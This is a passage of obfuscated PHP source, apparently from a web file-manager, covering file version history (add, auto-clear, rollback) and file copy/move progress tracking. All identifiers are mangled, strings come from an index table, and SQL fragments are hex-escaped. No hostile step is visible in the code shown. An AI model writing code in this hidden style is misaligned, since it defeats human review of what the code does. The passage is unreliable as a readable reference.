$ÂºìÙèÏ[557] && isset($è¤õàÇ [$ÂºìÙèÏ[1158]])) { $›É¯ÃÙŞ[] = $è¤õàÇ [$ÂºìÙèÏ[1158]] . $ÂºìÙèÏ[12]; $›É¯ÃÙŞ[] = $è¤õàÇ [$ÂºìÙèÏ[1159]] . $ÂºìÙèÏ[12]; } if ($ï„Ì†Ìñ[$ÂºìÙèÏ[33]] == $ÂºìÙèÏ[2082] && isset($è¤õàÇ [$ÂºìÙèÏ[402]])) { $›É¯ÃÙŞ[] = $è¤õàÇ [$ÂºìÙèÏ[402]] . $ÂºìÙèÏ[12]; } } $›É¯ÃÙŞ = array_merge($›É¯ÃÙŞ, $àŞ®¡ßà, array($¥ïÎÊÁö . $ÂºìÙèÏ[12])); $›É¯ÃÙŞ = array_unique($›É¯ÃÙŞ); $ßÓÁšşˆ = array_unique(array_to_keyvalue($ ÉëÙ¿Ç, $ÂºìÙèÏ[12], $ÂºìÙèÏ[1660])); $Å«„èÜ˜ = Model($ÂºìÙèÏ[535])->userListInfo($ßÓÁšşˆ); $¬ÃıèŞ› = Model($ÂºìÙèÏ[816])->sourceListInfo($›É¯ÃÙŞ, !0); foreach ($ ÉëÙ¿Ç as &$ï„Ì†Ìñ) { if ($ï„Ì†Ìñ[$ÂºìÙèÏ[33]] == $ÂºìÙèÏ[557] && isset($ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[1158]])) { $ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[1158]] = $¬ÃıèŞ›[$ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[1158]]]; $ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[1159]] = $¬ÃıèŞ›[$ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[1159]]]; } if ($ï„Ì†Ìñ[$ÂºìÙèÏ[33]] == $ÂºìÙèÏ[2082] && isset($ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[402]])) { $ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[402]] = $¬ÃıèŞ›[$ï„Ì†Ìñ[$ÂºìÙèÏ[453]][$ÂºìÙèÏ[402]]]; } $ï„Ì†Ìñ[$ÂºìÙèÏ[86]] = $¬ÃıèŞ›[$ï„Ì†Ìñ[$ÂºìÙèÏ[402]]]; $ï„Ì†Ìñ[$ÂºìÙèÏ[2087]] = $¬ÃıèŞ›[$ï„Ì†Ìñ[$ÂºìÙèÏ[2072]]]; if ($ï„Ì†Ìñ[$ÂºìÙèÏ[33]] == $ÂºìÙèÏ[1818]) { $ï„Ì†Ìñ[$ÂºìÙèÏ[2087]] = $ï„Ì†Ìñ[$ÂºìÙèÏ[86]]; $ï„Ì†Ìñ[$ÂºìÙèÏ[2072]] = $ï„Ì†Ìñ[$ÂºìÙèÏ[2087]][$ÂºìÙèÏ[402]]; $ï„Ì†Ìñ[$ÂºìÙèÏ[86]] = !1; $ï„Ì†Ìñ[$ÂºìÙèÏ[402]] = $ÂºìÙèÏ[12]; } $ï„Ì†Ìñ[$ÂºìÙèÏ[2017]] = $Å«„èÜ˜[$ï„Ì†Ìñ[$ÂºìÙèÏ[1660]]]; } unset($ï„Ì†Ìñ); $îÈÚü¦ò[$ÂºìÙèÏ[369]] = $ ÉëÙ¿Ç; return $îÈÚü¦ò; } public function removeBySource($ÊÖÁíÀê) { $şÚ°Ä¤§ = array($_SERVER[­õöî’–][417] => $ÊÖÁíÀê); $this->where($şÚ°Ä¤§)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\143\x65\137\150\151\163\164\x6f\162\x79"; public function historyCount($×¡ù¤¾) { $ı¯Ğö˜ä =& $_SERVER[­õöî’–]; if (!$×¡ù¤¾) { return array(); } if (is_string($×¡ù¤¾) || is_int($×¡ù¤¾)) { $×¡ù¤¾ = array($×¡ù¤¾); } $Ú”‘¢õé = array($ı¯Ğö˜ä[402], $ı¯Ğö˜ä[1882] => $ı¯Ğö˜ä[500]); $ªî“é¾í = array($ı¯Ğö˜ä[402] => array($ı¯Ğö˜ä[7], $×¡ù¤¾)); $¸•äİå© = $this->field($Ú”‘¢õé)->where($ªî“é¾í)->group($ı¯Ğö˜ä[402])->select(); return array_to_keyvalue($¸•äİå©, $ı¯Ğö˜ä[402], $ı¯Ğö˜ä[500]); } public function addHistory($µ«åš›ç, $¡˜í§è¥ = '') { $ÌÑá÷›Á =& $_SERVER[­õöî’–]; $Êƒ¬×£œ = array($ÌÑá÷›Á[417] => $µ«åš›ç[$ÌÑá÷›Á[402]], $ÌÑá÷›Á[1651] => isset($µ«åš›ç[$ÌÑá÷›Á[456]]) ? $µ«åš›ç[$ÌÑá÷›Á[456]] : $µ«åš›ç[$ÌÑá÷›Á[454]], $ÌÑá÷›Á[469] => $µ«åš›ç[$ÌÑá÷›Á[468]], $ÌÑá÷›Á[585] => $µ«åš›ç[$ÌÑá÷›Á[76]], $ÌÑá÷›Á[2088] => $¡˜í§è¥); if ($GLOBALS[$ÌÑá÷›Á[6]][$ÌÑá÷›Á[89]][$ÌÑá÷›Á[1216]] >= 1) { $this->historyAutoClear($Êƒ¬×£œ[$ÌÑá÷›Á[402]]); $this->add($Êƒ¬×£œ); } Hook::trigger($ÌÑá÷›Á[2089], $Êƒ¬×£œ); Model($ÌÑá÷›Á[2090])->eventFileEdit($µ«åš›ç[$ÌÑá÷›Á[402]]); } private function historyAutoClear($ïàíúà‡) { $õÂš”ŞÚ =& $_SERVER[­õöî’–]; $±·£ÒÇÌ = Model($õÂš”ŞÚ[761])->get($õÂš”ŞÚ[1238]); $Áçèúİ— = $GLOBALS[$õÂš”ŞÚ[6]][$õÂš”ŞÚ[89]][$õÂš”ŞÚ[1216]]; $¶ıåÖñ = $±·£ÒÇÌ == $õÂš”ŞÚ[1239] ? min(5, $Áçèúİ—) : $Áçèúİ—; $¶ıåÖñ = $¶ıåÖñ <= 0 ? 0 : $¶ıåÖñ - 1; if ($¶ıåÖñ >= 500) { return; } $áÄöö‘á = array($õÂš”ŞÚ[417] => $ïàíúà‡); $Ç‰›“‡ö = $this->field($õÂš”ŞÚ[2091])->where($áÄöö‘á)->order($õÂš”ŞÚ[2085])->select(); if (!$Ç‰›“‡ö || $¶ıåÖñ >= count($Ç‰›“‡ö)) { return; } $±ğâŸ£à = array_to_keyvalue($Ç‰›“‡ö, $õÂš”ŞÚ[12], $õÂš”ŞÚ[399]); $±ğâŸ£à = array_slice($±ğâŸ£à, $¶ıåÖñ); $¾ô£¸– = array_to_keyvalue($Ç‰›“‡ö, $õÂš”ŞÚ[12], $õÂš”ŞÚ[468]); $¾ô£¸– = array_slice($¾ô£¸–, $¶ıåÖñ); if (!$±ğâŸ£à || !$¾ô£¸–) { return; } $áÄöö‘á = array($õÂš”ŞÚ[419] => array($õÂš”ŞÚ[7], $±ğâŸ£à)); $this->where($áÄöö‘á)->delete(); Model($õÂš”ŞÚ[471])->remove($¾ô£¸–); } public function listData($Îš¥üÕ) { $àäŒÖêà =& $_SERVER[­õöî’–]; $Öù—Á÷Ğ = array($àäŒÖêà[417] => $Îš¥üÕ); $û ëÖÒÀ = $àäŒÖêà[2092]; $æÊ¢ˆ¤ = $this->field($û ëÖÒÀ)->where($Öù—Á÷Ğ)->order($àäŒÖêà[2085])->selectPage(); $this->_listAppendUser($æÊ¢ˆ¤[$àäŒÖêà[369]]); $¯öÛı÷‡ = Model($àäŒÖêà[761])->get($àäŒÖêà[1238]); $œôè¨¤­ = 5; if ($¯öÛı÷‡ == $àäŒÖêà[1239]) { $æÊ¢ˆ¤[$àäŒÖêà[369]] = array_slice($æÊ¢ˆ¤[$àäŒÖêà[369]], 0, $œôè¨¤­); $æÊ¢ˆ¤[$àäŒÖêà[366]] = array($àäŒÖêà[2093] => 1, $àäŒÖêà[2094] => 20, $àäŒÖêà[2095] => 1, $àäŒÖêà[2096] => count($æÊ¢ˆ¤[$àäŒÖêà[369]])); } return $æÊ¢ˆ¤; } protected function _listAppendUser(&$„Òİ‡ë) { $î½ÅïüÍ =& $_SERVER[­õöî’–]; $ğıÑïºè = array_to_keyvalue($„Òİ‡ë, $î½ÅïüÍ[12], $î½ÅïüÍ[1660]); $šª°ÃåË = Model($î½ÅïüÍ[535])->userListInfo($ğıÑïºè); foreach ($„Òİ‡ë as &$éŒ®É“¶) { $í¬œ”¹ó = $éŒ®É“¶[$î½ÅïüÍ[1660]]; $éŒ®É“¶[$î½ÅïüÍ[454]] = $šª°ÃåË[$í¬œ”¹ó] ? $šª°ÃåË[$í¬œ”¹ó] : !1; } unset($éŒ®É“¶); } public function fileInfo($’•¨ÉŠõ) { $Ó‰ã–ˆ­ =& $_SERVER[­õöî’–]; $ŠË…¬ä€ = $this->tablePrefix; $’ûïÈ¦‡ = "{$ŠË…¬ä€}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\151\154\145\163\x20\157\156\x20\146\x69\154\145\163\56\x66\151\154\x65\111\104\x20\x3d\x20\x68\151\x73\x74\x6f\x72\171\x2e\146\151\x6c\145\111\x44"; return $this->alias($Ó‰ã–ˆ­[2097])->where(array($Ó‰ã–ˆ­[419] => $’•¨ÉŠõ))->join($’ûïÈ¦‡, $Ó‰ã–ˆ­[2098])->find(); } public function removeItem($ô°ş´Ôı) { $¨ñ—øÕ€ =& $_SERVER[­õöî’–]; $Ğˆ€Şö— = array($¨ñ—øÕ€[419] => $ô°ş´Ôı); $Å»¼¹Å¥ = $this->where($Ğˆ€Şö—)->find(); if ($Å»¼¹Å¥) { $Ó¯á¿íí = $this->where($Ğˆ€Şö—)->delete(); Model($¨ñ—øÕ€[471])->remove($Å»¼¹Å¥[$¨ñ—øÕ€[468]]); return $Ó¯á¿íí; } return !1; } public function removeBySource($–ã©ü›) { $®©œ¨ï¢ =& $_SERVER[­õöî’–]; if (!$–ã©ü›) { return !1; } if (!is_array($–ã©ü›)) { $–ã©ü› = array($–ã©ü›); } $ÍÓıá¶Ş = array($®©œ¨ï¢[417] => array($®©œ¨ï¢[7], $–ã©ü›)); $™Øñ°úõ = $this->field($®©œ¨ï¢[469])->where($ÍÓıá¶Ş)->select(); if ($™Øñ°úõ) { $this->where($ÍÓıá¶Ş)->delete(); $¤Âƒ¯±ç = array_to_keyvalue($™Øñ°úõ, $®©œ¨ï¢[12], $®©œ¨ï¢[468]); Model($®©œ¨ï¢[471])->remove($¤Âƒ¯±ç); } return !0; } public function setDetail($ùëíÊö¹, $ªÅâ÷) { $üÇËƒ×­ =& $_SERVER[­õöî’–]; return $this->where(array($üÇËƒ×­[419] => $ùëíÊö¹))->save(array($üÇËƒ×­[2088] => $ªÅâ÷)); } public function rollbackToItem($÷‘ÖçğÑ, $Ó–åô) { $£«Ô«° =& $_SERVER[­õöî’–]; $Œâ·î¨ = Model($£«Ô«°[816])->sourceInfo($÷‘ÖçğÑ); $this->addHistory($Œâ·î¨, LNG($£«Ô«°[2099])); $Îö’ø™Ü = $this->find($Ó–åô); $ä©‚”Å = array($£«Ô«°[468] => $Îö’ø™Ü[$£«Ô«°[468]], $£«Ô«°[76] => $Îö’ø™Ü[$£«Ô«°[76]], $£«Ô«°[85] => time(), $£«Ô«°[456] => USER_ID); Model($£«Ô«°[816])->where(array($£«Ô«°[402] => $÷‘ÖçğÑ))->save($ä©‚”Å); return $this->where(array($£«Ô«°[419] => $Ó–åô))->delete(); } public function clearSame($€Ç‹¨òÅ) { $İú¦·È =& $_SERVER[­õöî’–]; $ÔÍ¢Ì± = $this->listData($€Ç‹¨òÅ); $’ÎâÔ¼— = array_to_keyvalue_group($ÔÍ¢Ì±, $İú¦·È[468]); $á²ëâ€– = array(); $†–İœ±¹ = array(); foreach ($’ÎâÔ¼— as $¿™¥šçÃ) { if (!$¿™¥šçÃ || count($¿™¥šçÃ) <= 1) { continue; } foreach ($¿™¥šçÃ as $Èü­Ï‰ä) { $á²ëâ€–[] = $Èü­Ï‰ä[$İú¦·È[468]]; $†–İœ±¹[] = $Èü­Ï‰ä[$İú¦·È[399]]; } } if (!$†–İœ±¹) { return; } $this->where(array($İú¦·È[399] => array($İú¦·È[7], $†–İœ±¹)))->delete(); Model($İú¦·È[471])->remove($á²ëâ€–); } public function userSpace() { $Ãñ±Êƒ¸ =& $_SERVER[­õöî’–]; $ŞÑÉç¦ = $this->tablePrefix; $²Š‰Ìì = array($Ãñ±Êƒ¸[1651] => USER_ID); $¹ùœİÕñ = "{$ŞÑÉç¦}\x69\157\137\146\x69\154\145\40\x66\151\154\145\163\x20\x6f\x6e\40\x66\x69\x6c\x65\x73\56\x66\151\154\x65\111\104\x20\x3d\40\x68\x69\163\x74\x6f\x72\171\56\x66\x69\x6c\145\x49\x44"; return $this->alias($Ãñ±Êƒ¸[2097])->where($²Š‰Ìì)->join($¹ùœİÕñ, $Ãñ±Êƒ¸[2098])->sum($Ãñ±Êƒ¸[76]); } } goto d¸™›ê‡Á„; A—«’ÔŸøô: class TaskFileTransfer extends Task { protected function startAfter() { $íí¨’û‰ =& $_SERVER[­õöî’–]; $è¡½òÙŒ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($íí¨’û‰[1690], array($this, $íí¨’û‰[1691])); Hook::bind($íí¨’û‰[1222], array($this, $íí¨’û‰[1692])); Hook::bind($íí¨’û‰[1693], array($this, $íí¨’û‰[1694])); Hook::bind($íí¨’û‰[604], array($this, $íí¨’û‰[1695])); Hook::bind($íí¨’û‰[605], array($this, $íí¨’û‰[1696])); Hook::bind($íí¨’û‰[610], array($this, $íí¨’û‰[1697])); Hook::bind($íí¨’û‰[611], array($this, $íí¨’û‰[1698])); Hook::bind($íí¨’û‰[607], array($this, $íí¨’û‰[1699])); Hook::bind($íí¨’û‰[608], array($this, $íí¨’û‰[1700])); Hook::bind($íí¨’û‰[574], array($this, $íí¨’û‰[1701])); Hook::bind($íí¨’û‰[571], array($this, $íí¨’û‰[1701])); Hook::bind($íí¨’û‰[576], array($this, $íí¨’û‰[1701])); Hook::bind($íí¨’û‰[578], array($this, $íí¨’û‰[1701])); Hook::bind($íí¨’û‰[580], array($this, $íí¨’û‰[1701])); Hook::bind($íí¨’û‰[1702], array($this, $íí¨’û‰[1703])); Hook::bind($íí¨’û‰[597], array($this, $íí¨’û‰[1704])); $this->sourceModelCopyFlag = !1; Hook::bind($íí¨’û‰[1705], array($this, $íí¨’û‰[1706])); Hook::bind($íí¨’û‰[1707], array($this, $íí¨’û‰[1708])); Hook::bind($íí¨’û‰[1709], array($this, $íí¨’û‰[1710])); $è¡½òÙŒ[$íí¨’û‰[1711]] = LNG($íí¨’û‰[1712]); $è¡½òÙŒ[$íí¨’û‰[1713]] = 0; $è¡½òÙŒ[$íí¨’û‰[1714]] = 0; $è¡½òÙŒ[$íí¨’û‰[1062]] = $íí¨’û‰[12]; $è¡½òÙŒ[$íí¨’û‰[1715]] = $íí¨’û‰[12]; $è¡½òÙŒ[$íí¨’û‰[1716]] = 0; $è¡½òÙŒ[$íí¨’û‰[1717]] = 0; $è¡½òÙŒ[$íí¨’û‰[1718]] = 0; if (!$è¡½òÙŒ[$íí¨’û‰[1560]]) { $è¡½òÙŒ[$íí¨’û‰[1560]] = LNG($íí¨’û‰[1719]); } } protected function endAfter() { $ˆ¹†•¨² =& $_SERVER[­õöî’–]; Hook::unbind($ˆ¹†•¨²[1690], array($this, $ˆ¹†•¨²[1691])); Hook::unbind($ˆ¹†•¨²[1222], array($this, $ˆ¹†•¨²[1692])); Hook::unbind($ˆ¹†•¨²[1693], array($this, $ˆ¹†•¨²[1694])); Hook::unbind($ˆ¹†•¨²[604], array($this, $ˆ¹†•¨²[1695])); Hook::unbind($ˆ¹†•¨²[605], array($this, $ˆ¹†•¨²[1696])); Hook::unbind($ˆ¹†•¨²[610], array($this, $ˆ¹†•¨²[1697])); Hook::unbind($ˆ¹†•¨²[611], array($this, $ˆ¹†•¨²[1698])); Hook::unbind($ˆ¹†•¨²[607], array($this, $ˆ¹†•¨²[1699])); Hook::unbind($ˆ¹†•¨²[608], array($this, $ˆ¹†•¨²[1700])); Hook::unbind($ˆ¹†•¨²[574], array($this, $ˆ¹†•¨²[1701])); Hook::unbind($ˆ¹†•¨²[571], array($this, $ˆ¹†•¨²[1701])); Hook::unbind($ˆ¹†•¨²[576], array($this, $ˆ¹†•¨²[1701])); Hook::unbind($ˆ¹†•¨²[578], array($this, $ˆ¹†•¨²[1701])); Hook::unbind($ˆ¹†•¨²[580], array($this, $ˆ¹†•¨²[1701])); Hook::unbind($ˆ¹†•¨²[1702], array($this, $ˆ¹†•¨²[1703])); Hook::unbind($ˆ¹†•¨²[597], array($this, $ˆ¹†•¨²[1704])); Hook::unbind($ˆ¹†•¨²[1705], array($this, $ˆ¹†•¨²[1706])); Hook::unbind($ˆ¹†•¨²[1707], array($this, $ˆ¹†•¨²[1708])); Hook::unbind($ˆ¹†•¨²[1709], array($this, $ˆ¹†•¨²[1710])); } public function copyMoveStart($Ÿ°Ø«ÔÓ, $ÑÖ™İ£İ, $ú×«ŒÀå, $Î¿Îôµ¥) { $ıØ“¼¨ =& $_SERVER[­õöî’–]; self::log($ıØ“¼¨[1720] . $ÑÖ™İ£İ . $ıØ“¼¨[70] . $Î¿Îôµ¥); $¨úÍ·é¤ = rtrim(TEMP_FILES, $ıØ“¼¨[8]); if (substr($ÑÖ™İ£İ, 0, strlen($¨úÍ·é¤)) == $¨úÍ·é¤) { return; } if (substr($Î¿Îôµ¥, 0, strlen($¨úÍ·é¤)) == $¨úÍ·é¤) { return; } $í£ªÏÛ¯ =& $this->task; $í£ªÏÛ¯[$ıØ“¼¨[1721]] = KodIO::transferType($Ÿ°Ø«ÔÓ, $ú×«ŒÀå); $this->update(); } public function updateAfter() { $ïÅ¦Íˆ» =& $_SERVER[­õöî’–]; $ëß£«ä‚ =& $this->task; if (!$ëß£«ä‚[$ïÅ¦Íˆ»[754]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ëß£«ä‚[$ïÅ¦Íˆ»[1721]] == $ïÅ¦Íˆ»[1311]) { return; } self::updateTask($ëß£«ä‚); } private static function updateTask(&$º·Ú¥Åò) { $òŒ¿ş© =& $_SERVER[­õöî’–]; if ($º·Ú¥Åò[$òŒ¿ş©[1721]] == $òŒ¿ş©[1193] || $º·Ú¥Åò[$òŒ¿ş©[1721]] == $òŒ¿ş©[107]) { if ($º·Ú¥Åò[$òŒ¿ş©[1715]]) { $º·Ú¥Åò[$òŒ¿ş©[1718]] = $º·Ú¥Åò[$òŒ¿ş©[1717]] + $º·Ú¥Åò[$òŒ¿ş©[1714]]; } } else { if ($º·Ú¥Åò[$òŒ¿ş©[1721]] == $òŒ¿ş©[1312]) { if ($º·Ú¥Åò[$òŒ¿ş©[1715]] == $òŒ¿ş©[1193]) { $º·Ú¥Åò[$òŒ¿ş©[1718]] = $º·Ú¥Åò[$òŒ¿ş©[1717]] + $º·Ú¥Åò[$òŒ¿ş©[1714]] * 0.5; } else { if ($º·Ú¥Åò[$òŒ¿ş©[1715]] == $òŒ¿ş©[107]) { $º·Ú¥Åò[$òŒ¿ş©[1718]] = $º·Ú¥Åò[$òŒ¿ş©[1717]] + $º·Ú¥Åò[$òŒ¿ş©[1713]] * 0.5 + $º·Ú¥Åò[$òŒ¿ş©[1714]] * 0.5; } } } } $º·Ú¥Åò[$òŒ¿ş©[1662]] = $º·Ú¥Åò[$òŒ¿ş©[1718]] / $º·Ú¥Åò[$òŒ¿ş©[754]]; if ($º·Ú¥Åò[$òŒ¿ş©[1662]] > 0) { $şëÃô¤Û = timeFloat() - $º·Ú¥Åò[$òŒ¿ş©[1664]] - $º·Ú¥Åò[$òŒ¿ş©[1667]]; $º·Ú¥Åò[$òŒ¿ş©[1668]] = $şëÃô¤Û * (1 - $º·Ú¥Åò[$òŒ¿ş©[1662]]) / $º·Ú¥Åò[$òŒ¿ş©[1662]]; } } public function addPath($»äÏËì) { $º¦Œûëí =& $_SERVER[­õöî’–]; if (!$»äÏËì) { return; } $†¶ıô¹“ =& $this->task; $è‘˜ëõ = IO::infoWithChildren($»äÏËì); $™Á€”»æ = $†¶ıô¹“[$º¦Œûëí[1722]] ? $†¶ıô¹“[$º¦Œûëí[1722]][$º¦Œûëí[1723]] : 0; $†¶ıô¹“[$º¦Œûëí[1722]] = array($º¦Œûëí[1723] => $™Á€”»æ + 1, $º¦Œûëí[420] => $è‘˜ëõ[$º¦Œûëí[32]], $º¦Œûëí[84] => $è‘˜ëõ[$º¦Œûëí[84]], $º¦Œûëí[519] => $è‘˜ëõ[$º¦Œûëí[519]] ? $è‘˜ëõ[$º¦Œûëí[519]] : $è‘˜ëõ[$º¦Œûëí[84]]); if ($è‘˜ëõ[$º¦Œûëí[33]] == $º¦Œûëí[199]) { $†¶ıô¹“[$º¦Œûëí[777]] += 1; } else { $†¶ıô¹“[$º¦Œûëí[777]] += $è‘˜ëõ[$º¦Œûëí[79]][$º¦Œûëí[77]]; if ($è‘˜ëõ[$º¦Œûëí[402]]) { $†¶ıô¹“[$º¦Œûëí[777]] += $è‘˜ëõ[$º¦Œûëí[79]][$º¦Œûëí[78]] + 1; } } $†¶ıô¹“[$º¦Œûëí[754]] += $è‘˜ëõ[$º¦Œûëí[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ ÉŠ¥à´) { } public function sourceAddHashEnd($†šö Ï÷) { } public function sourceAddFileStart($èÀı™ÅÓ) { $Öùï‚ƒ =& $_SERVER[­õöî’–]; $½³ èíê =& $this->task; $½³ èíê[$Öùï‚ƒ[1713]] = $èÀı™ÅÓ[$Öùï‚ƒ[76]]; $½³ èíê[$Öùï‚ƒ[1711]] = $èÀı™ÅÓ[$Öùï‚ƒ[32]]; $½³ èíê[$Öùï‚ƒ[1062]] = $èÀı™ÅÓ[$Öùï‚ƒ[32]]; $½³ èíê[$Öùï‚ƒ[1724]] = $èÀı™ÅÓ[$Öùï‚ƒ[84]]; $this->update(); } public function sourceAddFileEnd($«ÒÒ÷„) { $–ı„½¿• =& $_SERVER[­õöî’–]; $ü®Ôò…š =& $this->task; $ü®Ôò…š[$–ı„½¿•[1718]] += $«ÒÒ÷„[$–ı„½¿•[76]]; $ü®Ôò…š[$–ı„½¿•[1724]] = $«ÒÒ÷„[$–ı„½¿•[84]]; $this->update(1); } public function copyFileStart($ŞëÓÒö, $óÚÒÆò·, $ØëÑ° Ù, $•¯¥ÒÓÉ, $©§¦ã›°, $œ»²é­) { $ŸŞ”©Íò =& $_SERVER[­õöî’–]; $òµ¼¥Å = $©§¦ã›°; if ($òµ¼¥Å == $GLOBALS[$ŸŞ”©Íò[1725]]) { $òµ¼¥Å = $GLOBALS[$ŸŞ”©Íò[1726]]; } $GLOBALS[$ŸŞ”©Íò[1726]] = $©§¦ã›°; $GLOBALS[$ŸŞ”©Íò[1725]] = $œ»²é­; $µßıõı =& $this->task; $µßıõı[$ŸŞ”©Íò[1711]] = $òµ¼¥Å; $µßıõı[$ŸŞ”©Íò[1713]] = (int) $ŞëÓÒö->size($óÚÒÆò·); $µßıõı[$ŸŞ”©Íò[1714]] = 0; $µßıõı[$ŸŞ”©Íò[1062]] = $ŸŞ”©Íò[12]; $µßıõı[$ŸŞ”©Íò[1715]] = $ŸŞ”©Íò[12]; $µßıõı[$ŸŞ”©Íò[1716]] = 0; $—¾Ó¼ğ× = $µßıõı[$ŸŞ”©Íò[1713]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($µßıõı[$ŸŞ”©Íò[399]] . $ŸŞ”©Íò[1727]); if ($—¾Ó¼ğ× && file_exists(get_path_father($•¯¥ÒÓÉ))) { Cache::set($µßıõı[$ŸŞ”©Íò[399]] . $ŸŞ”©Íò[1727], $•¯¥ÒÓÉ); $µßıõı[$ŸŞ”©Íò[1684]] = array($ŸŞ”©Íò[1728], $ŸŞ”©Íò[1729]); } $this->update(0, $—¾Ó¼ğ×); } public static function updateCopyLocalFileSize($šÓù±ƒŞ) { $Ä©å„‹… =& $_SERVER[­õöî’–]; $©êó¼Œ° = Cache::get($šÓù±ƒŞ[$Ä©å„‹…[399]] . $Ä©å„‹…[1727]); if (!$©êó¼Œ° || !file_exists($©êó¼Œ°)) { return $šÓù±ƒŞ; } $šÓù±ƒŞ[$Ä©å„‹…[1714]] = @filesize($©êó¼Œ°); $šÓù±ƒŞ[$Ä©å„‹…[1718]] += $šÓù±ƒŞ[$Ä©å„‹…[1714]]; self::updateTask($šÓù±ƒŞ); return $šÓù±ƒŞ; } public function copyFileEnd($¢­ËÊõ‘, $¿¹äÚó, $¿Ãğ“ª‘, $¸’ƒ©£, $İÁ¯­şá, $ÒÍ¨ ¦Œ) { $¨ú”ôÛ =& $_SERVER[­õöî’–]; $äËõúÈ° =& $this->task; $äËõúÈ°[$¨ú”ôÛ[1714]] = $äËõúÈ°[$¨ú”ôÛ[1713]]; $äËõúÈ°[$¨ú”ôÛ[1715]] = $¨ú”ôÛ[12]; unset($äËõúÈ°[$¨ú”ôÛ[1684]]); if ($İÁ¯­şá == $äËõúÈ°[$¨ú”ôÛ[1711]]) { $äËõúÈ°[$¨ú”ôÛ[1717]] += $äËõúÈ°[$¨ú”ôÛ[1713]]; $äËõúÈ°[$¨ú”ôÛ[1718]] = $äËõúÈ°[$¨ú”ôÛ[1717]]; $ÍÜ’£× = 1; if (isset($äËõúÈ°[$¨ú”ôÛ[1724]]) && $äËõúÈ°[$¨ú”ôÛ[1724]] == $¿¹äÚó) { $ÍÜ’£× = 0; } $this->update($ÍÜ’£×); } else { $this->update(); $äËõúÈ°[$¨ú”ôÛ[1714]] = 0; } Cache::remove($äËõúÈ°[$¨ú”ôÛ[399]] . $¨ú”ôÛ[1727]); self::log($¨ú”ôÛ[1730] . $¿¹äÚó . $¨ú”ôÛ[70] . $¸’ƒ©£ . $¨ú”ôÛ[231] . $İÁ¯­şá . $¨ú”ôÛ[1731] . $äËõúÈ°[$¨ú”ôÛ[1711]]); } public function updateFileEnd($ÏûœÆ§›, $´öøö£) { $ùˆ½©Åö =& $_SERVER[­õöî’–]; $¡·Î“ØÙ =& $this->task; $¡·Î“ØÙ[$ùˆ½©Åö[1711]] = $ÏûœÆ§›; $¡·Î“ØÙ[$ùˆ½©Åö[1713]] = $´öøö£; $¡·Î“ØÙ[$ùˆ½©Åö[1717]] += $´öøö£; $¡·Î“ØÙ[$ùˆ½©Åö[1718]] = $¡·Î“ØÙ[$ùˆ½©Åö[1717]]; $this->update(1); self::log($ùˆ½©Åö[1732] . $ÏûœÆ§›); } public function sourceModelCopy($ô†ôøĞ) { $ú†îâêÏ =& $_SERVER[­õöî’–]; $Ş™ØÂ§á = $ô†ôøĞ[0]; $Õ†²ÆÖ· = $ô†ôøĞ[1]; $‡Š™—î¡ =& $this->task; $this->sourceModelCopyFlag = !0; $ÌÓÛø‡ = 0; switch ($Ş™ØÂ§á) { case $ú†îâêÏ[572]: $ÌÓÛø‡ = 1; break; case $ú†îâêÏ[575]: $‡Š™—î¡[$ú†îâêÏ[1711]] = $Õ†²ÆÖ·[$ú†îâêÏ[32]]; break; case $ú†îâêÏ[577]: $ÌÓÛø‡ = intval($ô†ôøĞ[$ú†îâêÏ[380]] * 0.4); break; case $ú†îâêÏ[579]: $ÌÓÛø‡ = intval($ô†ôøĞ[$ú†îâêÏ[380]] * 0.2); break; case $ú†îâêÏ[581]: $ÌÓÛø‡ = intval($ô†ôøĞ[$ú†îâêÏ[380]] * 0.4); break; } $this->update($ÌÓÛø‡); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ˆÖŸÖµõ, $ƒ“¦Ì) { $°ªÅ´ÛÉ =& $_SERVER[­õöî’–]; $this->sourceModelCopyFlag = !0; $£œ¼…Ç = 1; if (isset($ˆÖŸÖµõ[$°ªÅ´ÛÉ[79]])) { $£œ¼…Ç = $ˆÖŸÖµõ[$°ªÅ´ÛÉ[79]][$°ªÅ´ÛÉ[77]]; $£œ¼…Ç = $£œ¼…Ç + $ˆÖŸÖµõ[$°ªÅ´ÛÉ[79]][$°ªÅ´ÛÉ[78]] + 1; } $this->update($£œ¼…Ç); $this->sourceModelCopyFlag = !1; } public function sourceMove($úû®íÌ”) { $this->sourceRemove($úû®íÌ”, !1); } public function curlProgress($Ïª×™ö¯, $Ôê±æ‚µ, $°Íİå·â, $¥ÙÀáÄâ, $¿°¹İ½ò) { $îÑÓØØõ =& $_SERVER[­õöî’–]; $£û›ÓÀñ =& $this->task; if ($¿°¹İ½ò > 0) { $£û›ÓÀñ[$îÑÓØØõ[1062]] = $îÑÓØØõ[1733]; $£û›ÓÀñ[$îÑÓØØõ[1715]] = $îÑÓØØõ[107]; if ($£û›ÓÀñ[$îÑÓØØõ[1713]]) { $£û›ÓÀñ[$îÑÓØØõ[1714]] = $¿°¹İ½ò; } if ($£û›ÓÀñ[$îÑÓØØõ[1716]]) { $£û›ÓÀñ[$îÑÓØØõ[1714]] = $¿°¹İ½ò + $£û›ÓÀñ[$îÑÓØØõ[1716]]; } } else { if ($°Íİå·â > 0) { if ($£û›ÓÀñ[$îÑÓØØõ[1713]] == $Ôê±æ‚µ) { $£û›ÓÀñ[$îÑÓØØõ[1714]] = $°Íİå·â; $£û›ÓÀñ[$îÑÓØØõ[1062]] = $îÑÓØØõ[1734]; $£û›ÓÀñ[$îÑÓØØõ[1715]] = $îÑÓØØõ[1193]; } } } $this->update(); } public function curlProgressStart($»ãÌ•Èé) { } public function curlProgressEnd($äÇš±Õ§) { $¯£¿ë¢€ =& 